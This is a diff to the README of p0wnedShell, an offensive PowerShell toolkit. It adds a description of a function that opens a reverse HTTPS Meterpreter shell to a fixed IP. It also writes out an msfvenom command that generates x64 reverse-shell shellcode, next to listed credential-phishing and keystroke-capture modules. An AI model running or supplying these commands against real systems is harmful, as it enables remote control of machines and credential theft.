@@ -69,6 +69,8 @@ You could also use p0wnedReverse as a Payload for Spear Phishing Campaigns by em
 * Nishang Invoke-CredentialsPhish
 * Cn33liz Get-KeyStrokes (simple function that reads keystrokes from KeyLogger file)
 * Cn33liz Invoke-Meterpreter (wrapper around Invoke-Shellcode that needs an IP and Port argument to setup an reversed https meterpreter tunnel. Works only with x86 version)
+* Cn33liz Invoke-x64-Meterpreter Powershell function will setup a x64 reversed https meterpreter Shell to 192.168.1.120. To change this behaviour you need to create your own shellcode (msfvenom -p windows/x64/meterpreter/reverse_https LHOST=x.x.x.x LPORT=443 EXITFUNC=thread -f powershell) and update base64 encoded Invoke-x64-Meterpreter function in p0wnedReverseResources.cs
+
 
 Powershell functions within the Runspace are loaded in memory from
 [Base64 encode strings](https://github.com/Cn33liz/p0wnedShell/blob/master/Utilities/PS1ToBase64.ps1).
